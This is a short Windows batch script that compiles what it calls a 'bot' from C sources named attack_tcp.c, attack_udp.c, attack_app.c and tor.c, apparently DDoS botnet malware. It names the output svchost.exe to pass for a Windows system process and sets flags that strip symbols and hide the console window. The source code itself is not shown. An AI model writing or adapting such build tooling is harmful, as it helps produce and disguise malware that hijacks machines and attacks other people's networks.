@echo off
set "OUT=svchost.exe"
set "FILES=main.c attack_tcp.c attack_udp.c attack_app.c rand.c table.c tor.c utils.c"
set "LIBS=-lws2_32 -luser32 -lshell32 -lwininet"
set "FLAGS=-static -s -mwindows"

echo building bot for windows (DEBUG)
gcc -o %OUT% %FILES% %LIBS% -static -DDEBUG

if %errorlevel% neq 0 (
    echo Error de compilacion
    pause
    exit /b %errorlevel%
)

echo save as %OUT%
pause
